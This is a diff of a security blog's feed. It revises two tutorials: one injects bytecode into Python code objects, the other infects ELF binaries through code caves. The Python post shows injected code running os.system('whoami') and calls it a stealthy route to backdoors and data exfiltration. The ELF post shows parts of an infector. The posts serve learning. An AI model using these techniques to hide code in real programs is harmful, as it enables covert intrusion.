@@ -83,7 +83,7 @@ The focus for us is the &lt;code&gt;__code__&lt;/code&gt; attribute, which is a 
 &lt;li&gt;Each offset is a multiple of 2. Well why? Because, some opcodes can receive an operand such as &lt;code&gt;LOAD_FAST&lt;/code&gt;, whereas &lt;code&gt;BINARY_ADD&lt;/code&gt; doesn&amp;rsquo;t. However, since of python 3.6 every instruction will get an argument so that every opcode has 2 bytes.
 &lt;em&gt;(There are cases in which the argument gets larger than 2 bytes and it will be split in multiple bytes, but it&amp;rsquo;s always going to be a multiple of 2)&lt;/em&gt;&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;In order to make some sense out of any bytecode, we need to understand how the Python Virtual Machine &lt;em&gt;(PVM)&lt;/em&gt;* works.&lt;/p&gt;
+&lt;p&gt;In order to make some sense out of any bytecode, we need to understand how the Python Virtual Machine &lt;em&gt;(PVM)&lt;/em&gt; works.&lt;/p&gt;
 &lt;h2 id=&#34;ok-but-how-does-python-actually-uses-bytecode&#34;&gt;Ok but how does python actually uses bytecode&lt;/h2&gt;
 &lt;p&gt;The PVM is written in C and you can find it &lt;a href=&#34;https://github.com/python/cpython&#34;&gt;here&lt;/a&gt;. The most important thing to understand is that CPython is a stack-oriented virtual machine. A stack&amp;rsquo;s primary operations are load/push and store/pop. We can load/push a value on the top of an upwardly-growing stack &lt;em&gt;(incrementing the stack pointer)&lt;/em&gt; and we can store/pop a value from the top of the stack &lt;em&gt;(decrementing the stack pointer)&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;To better illustrate this let&amp;rsquo;s have a look at an example. Consider the following hypothethical instructions:&lt;/p&gt;
@@ -162,25 +162,15 @@ The focus for us is the &lt;code&gt;__code__&lt;/code&gt; attribute, which is a 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For an easier understanding let&amp;rsquo;s ignore the &amp;lsquo;X&amp;rsquo; marked bytecodes and focus more on the others. So, we firstly push to the evaluation stack 2 consts from the &lt;code&gt;co_consts&lt;/code&gt; list at index 2 and 3 which are our function&amp;rsquo;s arguments &lt;em&gt;(values: 5, 10)&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;After, we call the function, specifying the nr of arguments it has &lt;em&gt;(&lt;code&gt;CALL_FUNCTION 2&lt;/code&gt;)&lt;/em&gt;. At this point, a frame is going to be created for the &lt;code&gt;add&lt;/code&gt; function which will have its own evaluation stack and block stack. Inside the add&amp;rsquo;s evaluation stack the bytecode for our function will be executed. So we load the values at index &lt;em&gt;0&lt;/em&gt; and &lt;em&gt;1&lt;/em&gt; from the &lt;code&gt;co_varnames&lt;/code&gt; list, which are our functions&amp;rsquo; arguments &lt;em&gt;(x, y)&lt;/em&gt;. Then we add them up, return the value and destroy the frame.&lt;/p&gt;
 &lt;p&gt;To better understand this process, let&amp;rsquo;s have a look at how these stacks behave and also at how the opcodes are actually defined within the interpreter.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;BINARY_ADD&lt;/strong&gt;
-load/push onto the stack the + of the two values on the top
-written &lt;code&gt;stack[stackp-1] = stack[stackp-1] + stack[stackp]; stackp -= 1&lt;/code&gt;
-(turns the two values on the top of the stack into their sum)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;LOAD_FAST N&lt;/strong&gt;
-load/push onto the stack the value stored in co_varnames[N],
-written stackp += 1, stack[stackp] = co_varnames[N]&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;LOAD_CONST N&lt;/strong&gt;
-pushes co_consts[N] onto the stack.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;LOAD_NAME N&lt;/strong&gt;
-pushes the value associated with co_names[N] onto the stack.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;RETURN_VALUE&lt;/strong&gt;
-returns with TOS (top of the stack) to the caller of the function.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;CALL_FUNCTION argc&lt;/strong&gt;
-calls a callable object with positional arguments. &lt;code&gt;argc&lt;/code&gt; indicates the number of positional arguments.
-the TOS contains positional arguments, with the right-most argument on top. CALL_FUNCTION pops all arguments
-and the callable object off the stack, calls the callable object with those arguments, and pushes the
-return value returned by the callable object.&lt;/p&gt;
-&lt;p&gt;( check the dis module &lt;a href=&#34;https://docs.python.org/3/library/dis.html#python-bytecode-instructions&#34;&gt;docs&lt;/a&gt; for a complete definition of all the instructions)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;BINARY_ADD&lt;/strong&gt;: load/push onto the stack the + of the two values on the top written &lt;code&gt;stack[stackp-1] = stack[stackp-1] + stack[stackp]; stackp -= 1&lt;/code&gt; (turns the two values on the top of the stack into their sum)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LOAD_FAST N&lt;/strong&gt;: load/push onto the stack the value stored in &lt;code&gt;co_varnames[N]&lt;/code&gt;, written &lt;code&gt;stackp += 1, stack[stackp] = co_varnames[N]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LOAD_CONST N&lt;/strong&gt;: pushes &lt;code&gt;co_consts[N]&lt;/code&gt; onto the stack.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LOAD_NAME N&lt;/strong&gt;: pushes the value associated with &lt;code&gt;co_names[N]&lt;/code&gt; onto the stack.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;RETURN_VALUE&lt;/strong&gt;: returns with TOS &lt;em&gt;(top of the stack)&lt;/em&gt; to the caller of the function.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CALL_FUNCTION argc&lt;/strong&gt;: calls a callable object with positional arguments. &lt;code&gt;argc&lt;/code&gt; indicates the number of positional arguments. The TOS contains positional arguments, with the right-most argument on top. &lt;code&gt;CALL_FUNCTION&lt;/code&gt; pops all arguments and the callable object off the stack, calls the callable object with those arguments, and pushes the return value returned by the callable object.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;(check the dis module &lt;a href=&#34;https://docs.python.org/3/library/dis.html#python-bytecode-instructions&#34;&gt;docs&lt;/a&gt; for a complete definition of all the instructions)&lt;/em&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BYTECODE								Main Frame						
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------								----------						&lt;span style=&#34;color:#f92672&#34;&gt;====&lt;/span&gt; is pop
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;																		&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;--&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is push
@@ -213,7 +203,7 @@ return value returned by the callable object.&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									| 	.........	|
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									|---------------|
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to explore more about how the PVM works, how frames are created, what are the C structures behind
-the scenes, check out this talk [] and the actual source code []&lt;/p&gt;
+the scenes, check out this &lt;a href=&#34;&#34;&gt;talk&lt;/a&gt; and the actual &lt;a href=&#34;&#34;&gt;source code&lt;/a&gt;&lt;/p&gt;
 &lt;h1 id=&#34;some-fun&#34;&gt;Some fun&lt;/h1&gt;
 &lt;h2 id=&#34;dict-vs&#34;&gt;dict() vs&lt;/h2&gt;
 &lt;p&gt;There&amp;rsquo;s a lot of debate on the internet about which is the more efficient way to define lists, dictionaries, etc.
@@ -285,11 +275,13 @@ if we check the exection time we see this:&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; RETURN_VALUE
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;They are pretty much the same, but with a few important differences. And those are the following:&lt;/p&gt;
-&lt;p&gt;LOAD_NAME  VS LOAD_GLOBAL	(offset 0)
-STORE_NAME VS STORE_FAST	(offset 10)
-LOAD_NAME  VS LOAD_FAST		(offset 12)&lt;/p&gt;
-&lt;p&gt;We know that LOAD_NAME is pushing values from co_names list onto the stack, which is pretty much the same as LOAD_GLOBAL. So no big difference there. Yet, we notice that the naked program is using the global namespace to load / store variables, while the main_func program is using it&amp;rsquo;s local namespace. Since, the global namespace is bigger than the local one, finding stuff is harder. As a result, it takes more time to execute.&lt;/p&gt;
-&lt;p&gt;So START USING YOUR MAIN FUNCTION PEOPLE :D&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;LOAD_NAME&lt;/code&gt; VS &lt;code&gt;LOAD_GLOBAL&lt;/code&gt;	&lt;em&gt;(offset 0 )&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;STORE_NAME&lt;/code&gt; VS &lt;code&gt;STORE_FAST&lt;/code&gt;	&lt;em&gt;(offset 10)&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LOAD_NAME&lt;/code&gt;  VS &lt;code&gt;LOAD_FAST&lt;/code&gt;	&lt;em&gt;(offset 12)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We know that &lt;code&gt;LOAD_NAME&lt;/code&gt; is pushing values from &lt;code&gt;co_names&lt;/code&gt; list onto the stack, which is pretty much the same as &lt;code&gt;LOAD_GLOBAL&lt;/code&gt;. So no big difference there. Yet, we notice that the naked program is using the global namespace to load / store variables, while the &lt;code&gt;main_func&lt;/code&gt; program is using it&amp;rsquo;s local namespace. Since, the global namespace is bigger than the local one, finding stuff is harder. As a result, it takes more time to execute.&lt;/p&gt;
+&lt;p&gt;So &lt;strong&gt;START USING YOUR MAIN FUNCTION PEOPLE :D&lt;/strong&gt;&lt;/p&gt;
 &lt;h2 id=&#34;injecting-the-code-object&#34;&gt;Injecting the code object&lt;/h2&gt;
 &lt;p&gt;Now that we have an idea about how code objects work, let&amp;rsquo;s try playing around with them. Suppose we have this function:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;():
@@ -304,7 +296,7 @@ LOAD_NAME  VS LOAD_FAST		(offset 12)&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; RETURN_VALUE
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So what would happen if we modify the &lt;code&gt;co_consts&lt;/code&gt; tuple, will this just return ur value instead ?
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So what would happen if we modify the &lt;code&gt;co_consts&lt;/code&gt; tuple, will this just return our value instead ?
 The answer is yes, computers are dumb they just do what they&amp;rsquo;re told to, so in this case it would load whatever value is at index 1 in &lt;code&gt;co_consts&lt;/code&gt; and return.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]: injConsts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wut happened?&amp;#34;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]: code_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__
@@ -392,7 +384,7 @@ the all 3 variable tuples (co_varnames, co_names, co_consts):&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_varnames: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_names   : (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_consts  : (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;) 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That was pretty easy, now let&amp;rsquo;s go and construct out injected bytecode and insert it before the function&amp;rsquo;s bytecode&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That was pretty easy, now let&amp;rsquo;s go and construct our injected bytecode and insert it before the function&amp;rsquo;s bytecode&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# inj_code = (&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x64&amp;#34;,  LOAD_CONST    (0)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x01&amp;#34;,  1&lt;/span&gt;
@@ -429,19 +421,21 @@ the all 3 variable tuples (co_varnames, co_names, co_consts):&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disas&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  inject&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  main_func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  naked&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  notes  __pycache__
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Victory !! We achieved code execution.&lt;/p&gt;
-&lt;p&gt;You can imagine how you could use this as a stealthy way to deploy stealthy backdoors, exfiltrate data, etc.
+&lt;p&gt;You can imagine how you could use this as a stealthy way to deploy backdoors, exfiltrate data, etc.
 The nice thing about this aproach is that your code gets executed by the current running process, without spawning a suspicios subprocess that may raise some alerts. I haven&amp;rsquo;t tested this yet, but I think that this kind of attack
 might be more effective if a deserialization vulnerability is in place.&lt;/p&gt;
 &lt;p&gt;There are some things to note though:&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;This example uses a simple add function. Hence, the interaction with different attributes are minimal &lt;em&gt;(e.g co_names was empty in our example)&lt;/em&gt;. Since there weren&amp;rsquo;t many interactions with some of the variable tuples, we could easily add our own and easily change the bytecode to load from those specific indexe&amp;rsquo;s
+&lt;li&gt;This example uses a simple &lt;code&gt;add()&lt;/code&gt; function. Hence, the interaction with different attributes are minimal &lt;em&gt;(e.g co_names was empty in our example)&lt;/em&gt;. Since there weren&amp;rsquo;t many interactions with some of the variable tuples, we could easily add our own and change the bytecode to load from those specific indexe&amp;rsquo;s
 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;li&gt;More complex functions might be harder to inject because you need to set the position of your injected variables in such a way that is compatible with the bytecode already in place. Consequently, it might not be as easy as inserting your injected code at the start, instead you will also need to modify some of the original bytecode instructions accordingly.
 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
-&lt;li&gt;Another thing that I noticed during my explorations is that function parameters play a big role in choosing how you position your injected variables.&lt;/li&gt;
+&lt;li&gt;Another thing that I noticed during my explorations is that function parameters play a big role in choosing how you position your injected variables.
+&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;You need access to the source code of your target&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Currently, I&amp;rsquo;m trying to develop a way to automatically inject any piece of bytecode in any function. However, I
-ran into some problems due to the points I made above. So if there are some python guru&amp;rsquo;s reading this, please
+ran into some problems due to the points I made above. So if there are some python gurus reading this, please
 reach out to me at &lt;code&gt;vlaghew@protonmail.com&lt;/code&gt; and we might develop something beautiful. Thanks !&lt;/p&gt;
 &lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;Since I just realized that this article got pretty lengthy I will stop here even if I wanted to aproach some other subjects such as: digging into the CPython Virtual Machine, Building an interpreter, etc. However, I might do that in separate articles. Until then, make sure to check out the awesome resources below which made the creation of this post possible and enlightened me about the unknown world of python vm. There are some great reads made by amazing people who share their knowledge, craft and experience.&lt;/p&gt;
@@ -470,11 +464,11 @@ reach out to me at &lt;code&gt;vlaghew@protonmail.com&lt;/code&gt; and we might 
       <pubDate>Sat, 25 Apr 2020 00:00:00 +0000</pubDate>
       
       <guid>https://vlagh3.github.io/posts/elf_inject/</guid>
-      <description>Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it. Ok, so with all of that being said let’s dive into it. Infection Technique
-This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:</description>
+      <description>Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it. Ok, so with all of that being said let’s dive into it.
+Infection Technique This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:</description>
       <content>&lt;p&gt;Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it.
-Ok, so with all of that being said let’s dive into it.
-Infection Technique&lt;/p&gt;
+Ok, so with all of that being said let’s dive into it.&lt;/p&gt;
+&lt;h2 id=&#34;infection-technique&#34;&gt;Infection Technique&lt;/h2&gt;
 &lt;p&gt;This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Find the padding area between &lt;code&gt;.text&lt;/code&gt; section and the next segment in the program.&lt;/li&gt;
@@ -483,7 +477,7 @@ Infection Technique&lt;/p&gt;
 &lt;li&gt;Patch the payload, so it can resume the normal execution of the program &lt;em&gt;(original entry point)&lt;/em&gt;.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;We are going to take advantage of the padding area &lt;em&gt;(that is almost always there)&lt;/em&gt; between segments. This basically happens because the operating system works with Page granularity and because of the way the segments are loaded into memory.&lt;/p&gt;
-&lt;p&gt;Anyway, in general it’s an unused area at the end of the .text section. The size of the padding depends on the size of the code, so it may vary from program to program. For that reason, some programs may not be able to be injected. &lt;em&gt;(I will let you guys find another creative ways to make it more efficient and reliable. 🙂 )&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Anyway, in general it’s an unused area at the end of the &lt;code&gt;.text&lt;/code&gt; section. The size of the padding depends on the size of the code, so it may vary from program to program. For that reason, some programs may not be able to be injected. &lt;em&gt;(I will let you guys find another creative ways to make it more efficient and reliable. 🙂 )&lt;/em&gt;&lt;/p&gt;
 &lt;h2 id=&#34;writing-the-injector&#34;&gt;Writing the injector&lt;/h2&gt;
 &lt;p&gt;I will not show the whole code. Instead, I will divide it in some of the most important functional blocks, so it will be easier to follow.
 You can find the whole source code and some of the newest implementations &lt;a href=&#34;https://github.com/vlagh3/elij&#34;&gt;on github&lt;/a&gt;.
@@ -500,7 +494,7 @@ Opening and mapping the target file &amp;amp; the payload&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	payload_fd   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open_and_map(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;psize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data1);
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;..
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code is pretty straightforward. We have a small check on the arguments we pass. After we pass (to the &lt;code&gt;open_and_map&lt;/code&gt; function) 2 variables that will store the file size and a pointer to the beginning of our file. Then, we get the file desciptors for both the payload and target file.&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code is pretty straightforward. We have a small check on the arguments we pass. After, we pass &lt;em&gt;(to the &lt;code&gt;open_and_map&lt;/code&gt; function)&lt;/em&gt; 2 variables that will store the file size and a pointer to the beginning of our file. Then, we get the file desciptors for both the payload and target file.&lt;/p&gt;
 &lt;p&gt;Let’s take a look at the &lt;code&gt;open_and_map&lt;/code&gt; function.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open_and_map&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filename, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;data) {
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd;
@@ -529,7 +523,7 @@ Opening and mapping the target file &amp;amp; the payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf_header &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) data;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e_point	   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_header&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_entry;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Entry point of %s: 0x%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)e_point)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can retrieve this kind of data because the pointer returned by &lt;code&gt;open_and_map&lt;/code&gt; function points to the actual content of the file. Thus we find the ELF header as the first thing in the file. The entry point is contained in the ELF header along with other useful information, so we just reference that information with the pointer that we’ve got to the ELF header. If you are  still confused about this, take a look at the &lt;a href=&#34;http://localhost:1313/posts/elf_struct/&#34;&gt;Exploring the ELF file structure article&lt;/a&gt; that I made and then look at the specs to understand what kind of information is kept by this structure.&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can retrieve this kind of data because the pointer returned by &lt;code&gt;open_and_map&lt;/code&gt; function points to the actual content of the file. Thus we find the ELF header as the first thing in the file. The entry point is contained in the ELF header along with other useful information, so we just reference that information with the pointer that we’ve got to the ELF header. If you are  still confused about this, take a look at the &lt;a href=&#34;https://vlagh3.github.io/posts/elf_struct/&#34;&gt;Exploring the ELF file structure article&lt;/a&gt; that I made and then look at the specs to understand what kind of information is kept by this structure.&lt;/p&gt;
 &lt;h3 id=&#34;finding-the-padding-between-the-two-load-segments&#34;&gt;Finding the padding between the two &lt;code&gt;LOAD&lt;/code&gt; segments.&lt;/h3&gt;
 &lt;p&gt;Now we need to find the padding I was talking about in the beginning of this article. Some may reffer to it as a codecave.
 Anyway, I wrote a function that it’s called from main.&lt;/p&gt;
@@ -592,7 +586,7 @@ Then we keep looking for segments with type &lt;code&gt;PT_LOAD&lt;/code&gt; and
 &lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Normally there are only 2 &lt;code&gt;PT_LOAD&lt;/code&gt; segments, so this function can be improved. I will let this as an exercise for the reader. 😀&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;the-payload&#34;&gt;The Payload&lt;/h2&gt;
-&lt;p&gt;It’s time to take a look at the payload itself, what it does and how to get it into memory. For the sake of this article, it consists of a simple classical hello world program written in assembly. I didn’t want to get dirty and complicated for the reader, so we can focus on the ELF injection process itself. Enough speaking let’s look at it.&lt;/p&gt;
+&lt;p&gt;It’s time to take a look at the payload itself, what it does and how to get it into memory. For the sake of this article, it consists of a simple classical hello world program written in assembly. I didn’t want to get dirty and complicated, so we can focus on the ELF injection process itself. Enough speaking let’s look at it.&lt;/p&gt;
